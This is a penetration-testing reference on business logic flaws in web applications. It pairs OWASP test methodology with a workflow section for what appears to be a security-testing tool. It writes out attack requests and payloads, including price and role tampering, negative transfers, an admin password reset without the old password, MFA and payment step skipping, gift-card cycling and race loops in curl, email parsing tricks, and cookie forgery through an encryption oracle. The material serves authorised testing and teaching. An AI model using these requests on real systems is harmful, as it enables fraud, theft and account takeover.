---
id: PS-BUSL
category: Business logic vulnerabilities
lab_count: 12
wstg_refs: [WSTG-BUSL-01, WSTG-BUSL-02, WSTG-BUSL-06]
---

# Business Logic Vulnerabilities: Attack Technique Reference

Business logic flaws arise from incorrect assumptions about how users will interact with the application. Unlike injection vulnerabilities that exploit technical parsing weaknesses, logic flaws exploit gaps in the application's workflow, validation, and state management. They are difficult to detect with automated scanners because they require understanding the business context -- what the application is supposed to do versus what it actually does when given unusual inputs, skipped steps, or boundary-case values. Every multi-step process, numerical calculation, access control decision, and conditional business rule is a potential target.

---

## 1. Detection

### 1A. Identify Logic-Heavy Functionality

Map all multi-step processes and business rules in the application:

- **E-commerce flows**: Cart management, pricing, discounts, promotions, checkout, payment processing
- **Authentication workflows**: Login, registration, password reset, MFA, email verification
- **Authorization decisions**: Role assignment, privilege changes, access control checks
- **Account management**: Profile updates, email changes, role requests, account deletion
- **Financial operations**: Transfers, refunds, balance adjustments, currency conversion
- **Content workflows**: Publish, approve, moderate, archive, delete
- **API rate limiting and quotas**: Usage limits, free tier restrictions, trial periods

### 1B. Map Trust Boundaries

For each workflow, identify where the application trusts client-supplied data without server-side re-validation:

```
# Intercept every request in a multi-step flow and note:
# 1. Which values are sent by the client?
# 2. Which values are validated server-side?
# 3. Which values are derived from previous steps (and can be replayed/modified)?
# 4. What happens if you skip a step?
# 5. What happens if you repeat a step?
```

### 1C. Understand Numerical Boundaries

```
# Test extreme values for every numerical input:
# Maximum integer: 2147483647 (32-bit signed)
# Overflow: 2147483648 (wraps to negative on 32-bit)
# Minimum integer: -2147483648
# Zero
# Negative: -1, -100, -99999
# Float precision: 0.01, 0.001, 99999999.99
# Very large: 999999999999999
```

---

## 2. Techniques

### 2A. Client-Side Control Bypass

Applications that rely on client-side validation (JavaScript, hidden form fields, client-side price calculation) for security-critical decisions can be bypassed by intercepting and modifying requests before they reach the server.

**Price manipulation:**
```
# Original add-to-cart request
POST /cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1&price=1299.00

# Modified request (change price)
POST /cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1&price=0.01
```

**Hidden field tampering:**
```
# Original form has hidden input: <input type="hidden" name="role" value="user">
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=attacker&password=pass&role=admin

# Original form has hidden input: <input type="hidden" name="discount" value="0">
POST /checkout HTTP/1.1

items=3&discount=100&total=0
```

**Client-side validation bypass:**
```
# JavaScript validates email format, length limits, allowed characters
# Intercept the POST request after JS validation and modify values
# The server may not re-validate these constraints

# JS enforces max quantity of 10:
POST /cart/update HTTP/1.1
quantity=99999

# JS enforces positive numbers only:
POST /transfer HTTP/1.1
amount=-500
```

> Lab refs: PS-BUSL-01

### 2B. Numerical Boundary Exploitation

Applications that validate whether a value is within range but fail to check for negative values, zero, overflows, or extreme magnitudes.

**Negative quantity/amount attacks:**
```
# Shopping cart: negative quantity to receive credit
POST /cart HTTP/1.1
productId=expensive-item&quantity=-1
# Cart total becomes negative → credit applied to balance

# Fund transfer: negative amount reverses direction
POST /transfer HTTP/1.1
fromAccount=attacker&toAccount=victim&amount=-1000
# Server checks: amount <= balance ✓ (since -1000 <= 500)
# Effect: $1000 transferred FROM victim TO attacker

# Refund with negative quantity
POST /refund HTTP/1.1
orderId=123&quantity=-5
# Double-negative: refund of negative quantity = charge = credit
```

**Integer overflow exploitation:**
```
# 32-bit signed integer max: 2,147,483,647
# Adding 1 wraps to: -2,147,483,648

# If price is calculated: unit_price * quantity
# unit_price = $50.00 (stored as 5000 cents)
# quantity = 2,147,483,647 / 5000 ≈ 429,496
# Overflow makes total negative

POST /cart HTTP/1.1
productId=1&quantity=429497

# Total wraps from large positive to negative
# Application may allow checkout at negative price (credit to account)
```

**Boundary value testing checklist:**
```
# For every numerical parameter, test:
0                    # Zero — division errors, free items
-1                   # Negative one — simplest negative test
-99999               # Large negative
2147483647           # Max 32-bit signed int
2147483648           # Overflow 32-bit signed int
4294967295           # Max 32-bit unsigned int
4294967296           # Overflow 32-bit unsigned int
9999999999999999     # Very large — overflow any type
0.0001               # Small float — rounding errors
99.999               # Float near boundary
1e308                # Max float
NaN                  # Not a number
Infinity             # Infinite value
```

> Lab refs: PS-BUSL-02, PS-BUSL-05

### 2C. Inconsistent Security Control Exploitation

Security controls applied at one point (e.g., registration) that can be circumvented by modifying values after the initial check passes.

**Post-registration email domain bypass:**
```
# Registration requires @company.com email for admin access
# Step 1: Register with attacker@company.com
POST /register HTTP/1.1
email=attacker@company.com&password=pass

# Step 2: After registration, change email to attacker's real email
POST /account/update-email HTTP/1.1
email=attacker@evil.com

# If the admin role was granted based on the REGISTRATION email
# and the email change does NOT revoke the role → attacker keeps admin access
```

**Role/privilege persistence after condition change:**
```
# User gets privilege based on condition X
# Condition X is later removed but privilege is not revoked

# Example: User subscribes to premium → gets premium features
# User cancels subscription → premium features should be removed
# Test: After cancellation, are premium API endpoints still accessible?
curl -sk -H 'Cookie: session=TOKEN' https://target.com/api/premium/export
```

> Lab refs: PS-BUSL-03

### 2D. Business Rule Exploitation

Application-specific rules around discounts, promotions, and entitlements that can be abused through sequence manipulation or repeated application.

**Coupon/discount stacking:**
```
# Apply coupon code
POST /cart/coupon HTTP/1.1
code=NEWUSER10

# Apply a different coupon code
POST /cart/coupon HTTP/1.1
code=SIGNUP5

# Try applying same coupon again — does it stack?
POST /cart/coupon HTTP/1.1
code=NEWUSER10

# Alternate between two coupons to stack discounts
# NEWUSER10 → SIGNUP5 → NEWUSER10 → SIGNUP5 → ...
# If the app only blocks consecutive duplicates but not alternating, discounts accumulate
```

**Discount threshold manipulation:**
```
# Store offers 10% off orders over $1000
# Step 1: Add expensive items until total > $1000
# Step 2: Discount applied
# Step 3: Remove expensive items, keep only cheap desired item
# Step 4: If discount persists on reduced total → free/discounted items

POST /cart/add HTTP/1.1
productId=expensive&quantity=5
# Total: $1500, discount applied: -$150

POST /cart/remove HTTP/1.1
productId=expensive&quantity=4
# Total: $300, but $150 discount may still be applied → $150 final
```

> Lab refs: PS-BUSL-04

### 2E. Exceptional Input Handling

Applications that truncate, normalize, or transform input in ways that bypass validation checks.

**Email truncation bypass:**
```
# Application truncates email to 255 characters
# Registration check requires @company.com domain for admin access
# Craft email where truncation removes the real domain, leaving @company.com

# aaaa...aaa@company.com.evil.com (very long)
# Truncated to: aaaa...aaa@company.com (if truncation point falls after @company.com)

# Construct: <padding>@company.com<padding>@evil.com
# Where total length > 255 so @evil.com is truncated
```

**String length boundary exploitation:**
```
# If a field is validated then stored with different length limits:
# Validation allows up to 500 chars
# Database column is VARCHAR(255)
# The stored value is silently truncated

# For usernames: create user with name that truncates to match admin
# Original admin: "administrator"
# Attacker registers: "administrator            x" (with padding to 255 chars)
# Stored (truncated): "administrator            " (trailing spaces)
# If comparison ignores trailing spaces → attacker is treated as admin
```

> Lab refs: PS-BUSL-06

### 2F. Dual-Use Endpoint Exploitation

Endpoints that serve multiple purposes based on which parameters are supplied. Removing optional parameters can change behavior in security-relevant ways.

**Password change without current password:**
```
# Normal password change request (authenticated as regular user)
POST /change-password HTTP/1.1
Cookie: session=USER_TOKEN

username=user&current-password=oldpass&new-password=newpass

# Remove the current-password parameter entirely
POST /change-password HTTP/1.1
Cookie: session=USER_TOKEN

username=admin&new-password=hacked

# If the endpoint serves both "user changes own password" (requires current)
# and "admin resets any password" (no current needed),
# removing current-password may trigger the admin code path
```

**Optional parameter removal testing:**
```
# For every form/API endpoint, try:
# 1. Submit with all parameters → baseline behavior
# 2. Remove each parameter one at a time → observe changes
# 3. Remove the parameter NAME as well (not just the value)
# 4. Add unexpected parameters (role=admin, debug=true, admin=1)
```

> Lab refs: PS-BUSL-07

### 2G. Workflow Bypass

Multi-step processes that can be bypassed by directly accessing later stages, skipping validation steps, or replaying earlier stages.

**Checkout step skipping:**
```
# Normal checkout flow:
# Step 1: POST /cart/checkout → validates items and prices
# Step 2: POST /checkout/shipping → selects shipping method
# Step 3: POST /checkout/payment → processes payment
# Step 4: GET /order-confirmation → shows confirmation

# Skip payment step — go directly from shipping to confirmation
# After Step 2, directly access:
GET /order-confirmation HTTP/1.1
# or
POST /checkout/confirm HTTP/1.1
# Order may be placed without payment
```

**Authentication step bypass:**
```
# MFA flow:
# Step 1: POST /login → username/password
# Step 2: GET /login/mfa → enter 2FA code
# Step 3: GET /dashboard → authenticated area

# After Step 1, skip Step 2 — directly navigate to:
GET /dashboard HTTP/1.1

# Or after Step 1, check if the session is already fully authenticated
# by requesting any authenticated endpoint
```

**State machine exploitation:**
```
# Application expects: Login → Select Role → Dashboard
# After login, directly access dashboard without role selection
# Default role may be assigned (possibly admin if role selection enforces restrictions)

# Application expects: Add to Cart → Checkout → Payment → Confirm
# Replay the "Add to Cart" request AFTER checkout but BEFORE payment
# Additional items may be added to a confirmed order at the pre-payment price
```

> Lab refs: PS-BUSL-08, PS-BUSL-09

### 2H. Infinite Resource Generation

Cyclic business rules that can be exploited to generate unlimited resources (store credit, currency, points).

**Gift card / store credit cycling:**
```
# Step 1: Buy a $10 gift card for $7 (using coupon DISCOUNT30)
POST /cart/add HTTP/1.1
productId=giftcard-10&quantity=1

POST /cart/coupon HTTP/1.1
code=DISCOUNT30

POST /checkout HTTP/1.1
# Pay $7 for $10 gift card

# Step 2: Redeem $10 gift card → $10 store credit
POST /gift-card/redeem HTTP/1.1
code=GIFTCARD-ABC123

# Step 3: Buy another $10 gift card with store credit ($7 after coupon)
# Step 4: Redeem for $10 credit
# Net gain: $3 per cycle
# Repeat indefinitely → infinite money

# Automate:
for i in $(seq 1 100); do
  # Buy gift card with coupon
  curl -sk -X POST -H 'Cookie: session=TOKEN' \
    -d 'productId=giftcard&quantity=1' https://target.com/cart/add
  curl -sk -X POST -H 'Cookie: session=TOKEN' \
    -d 'code=DISCOUNT30' https://target.com/cart/coupon
  curl -sk -X POST -H 'Cookie: session=TOKEN' \
    https://target.com/checkout
  # Redeem
  curl -sk -X POST -H 'Cookie: session=TOKEN' \
    -d "code=$GIFT_CODE" https://target.com/gift-card/redeem
done
```

**Points/rewards cycling:**
```
# Any system where: Action A gives points, points can buy Action A at a discount
# Referral programs: refer yourself via email alias → both get bonus
# Sign-up bonuses: create multiple accounts, transfer bonuses to main account
```

> Lab refs: PS-BUSL-10

### 2I. Encryption Oracle Exploitation

When the application encrypts user-controlled input and returns the ciphertext (or decrypts user-controlled ciphertext and returns plaintext), the attacker can use the application as an encryption/decryption oracle.

**Cookie-based encryption oracle:**
```
# Application encrypts error messages into a cookie for display after redirect
# Set-Cookie: notification=<encrypted("Invalid email address: attacker-input")>

# Step 1: Trigger an error with controlled input
POST /email-change HTTP/1.1
email=PAYLOAD_HERE

# Response: Set-Cookie: notification=<encrypted-blob>

# Step 2: Submit the encrypted cookie as a session token or auth cookie
# The application decrypts it and processes the content

# Step 3: Craft input such that after encryption, the result matches
# the expected format of another cookie (e.g., stay-logged-in cookie)

# Key challenges:
# - Determine block cipher mode (CBC, ECB) and block size
# - Account for prepended/appended text ("Invalid email: " prefix)
# - Align blocks so useful payload occupies complete blocks
# - Remove unwanted prefix by manipulating ciphertext blocks
```

**Block alignment technique:**
```
# If prefix is "Invalid email address: " (23 bytes)
# And block size is 16 bytes:
# Block 1: "Invalid email ad"  (16 bytes)
# Block 2: "dress: " + 9 bytes of input
# Block 3+: remaining input

# Pad input with 9 bytes to push useful content to block boundary:
# email=xxxxxxxxxadministrator:timestamp
# Block 1: "Invalid email ad"
# Block 2: "dress: xxxxxxxxx"
# Block 3: "administrator:ti"
# Block 4: "mestamp\x09\x09..."  (PKCS7 padding)

# Strip blocks 1 and 2 from ciphertext → remaining blocks decrypt to desired content
# Use as forged authentication cookie
```

> Lab refs: PS-BUSL-11

### 2J. Email Address Parsing Discrepancies

Different application components parse email addresses using different rules. An email that passes validation at one stage may be interpreted differently at another.

**Encoding-based bypass:**
```
# Registration requires non-@target.com emails
# But the email delivery system decodes encoded characters

# Try encoded @ signs and domain separators:
attacker@target.com                    # Blocked
attacker%40target.com@evil.com         # May pass validation as @evil.com
attacker@target.com%00@evil.com        # Null byte truncation
"attacker@target.com"@evil.com         # Quoted local part
attacker@target.com\n@evil.com         # Newline injection
```

**RFC 5321 compliance differences:**
```
# Technically valid but unusual email formats:
"attacker"@target.com                  # Quoted local part
attacker+tag@target.com                # Plus addressing
attacker@[127.0.0.1]                   # IP literal domain
attacker@target.com.                   # Trailing dot (FQDN)
ATTACKER@TARGET.COM                    # Case variation
```

> Lab refs: PS-BUSL-12

---

## 3. Testing Approach

### Systematic Logic Flaw Assessment

For every identified business workflow:

1. **Map the flow**: Document every step, request, parameter, and expected state transition
2. **Identify assumptions**: What does the developer assume about user behavior at each step?
3. **Test each assumption**: For each assumption, try the opposite

| Assumption | Test |
|------------|------|
| Users follow steps in order | Skip steps, repeat steps, go backwards |
| Users submit expected data types | Submit wrong types, empty values, extreme values |
| Users submit values within range | Submit negatives, zero, overflow values |
| Required fields are always present | Remove fields entirely (name and value) |
| Users have one active session | Use multiple sessions simultaneously |
| Client-side validation catches bad input | Bypass JS validation via proxy |
| Users complete the flow once | Repeat the flow, interleave multiple flows |
| Discounts/promotions apply correctly | Stack, alternate, apply to modified carts |

### Per-Endpoint Logic Test Matrix

For each state-changing endpoint:

- [ ] **Remove each parameter** individually (name + value, not just value)
- [ ] **Add unexpected parameters**: `admin=true`, `role=admin`, `debug=1`, `price=0`
- [ ] **Change parameter types**: string where int expected, array where string expected
- [ ] **Submit extreme numerical values**: 0, -1, MAX_INT, MAX_INT+1, very large floats
- [ ] **Replay the request**: Does repeating the action cause unintended duplication?
- [ ] **Change the HTTP method**: GET to POST, POST to PUT, add method override headers
- [ ] **Test as different user**: Can user A's request affect user B's resources?
- [ ] **Skip to this step directly**: Access without completing prior workflow steps

---

## 4. Common Logic Flaw Patterns

### Pattern Reference

| Pattern | Where to Find It | Test |
|---------|------------------|------|
| **Price trust** | Cart, checkout, payment | Modify price/total in request body |
| **Quantity abuse** | Cart, orders, transfers | Negative values, zero, overflow |
| **Step skipping** | Multi-step forms, checkout | Direct URL access to later steps |
| **Role manipulation** | Registration, profile updates | Add/modify role parameters |
| **Discount stacking** | Coupon/promo systems | Apply multiple codes, alternate codes |
| **Threshold gaming** | Tiered pricing, volume discounts | Add/remove items to trigger/retain discounts |
| **Race conditions** | Concurrent requests to same endpoint | Simultaneous requests for limited resources |
| **State confusion** | Session-dependent workflows | Multiple tabs, interleaved requests |
| **Default fallback** | Missing parameter handling | Remove optional params to trigger defaults |
| **Truncation bypass** | String length limits vs storage | Long inputs that truncate past validation |
| **Encoding discrepancy** | Email, URL, input parsing | Different encoding at validation vs processing |
| **Oracle abuse** | Encrypt/decrypt functionality | Use app as crypto oracle for forging tokens |

### Race Condition Testing

Logic flaws frequently interact with race conditions. Test concurrent requests for:

```
# Limited resource: gift card redemption, coupon application, vote submission
# Send the same request simultaneously from multiple threads:

# Using curl with background processes:
for i in $(seq 1 10); do
  curl -sk -X POST -H 'Cookie: session=TOKEN' \
    -d 'code=GIFTCARD123' \
    https://target.com/gift-card/redeem &
done
wait

# If the gift card is redeemed multiple times → race condition in logic
```

### Verification Checklist

- [ ] All multi-step workflows mapped with every step documented
- [ ] Client-side validation identified and bypass tested via proxy
- [ ] Numerical inputs tested with negative, zero, overflow, and extreme values
- [ ] Each workflow step accessible directly (step-skipping test)
- [ ] Optional parameters tested with removal (not just empty values)
- [ ] Business rules tested for stacking, cycling, and threshold manipulation
- [ ] Race conditions tested for time-of-check/time-of-use gaps
- [ ] Post-action state verified (does changing conditions revoke privileges?)
- [ ] Encryption/decryption features tested for oracle potential
## Rynix workflow

1. `get_technique_guide` for `business-logic` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

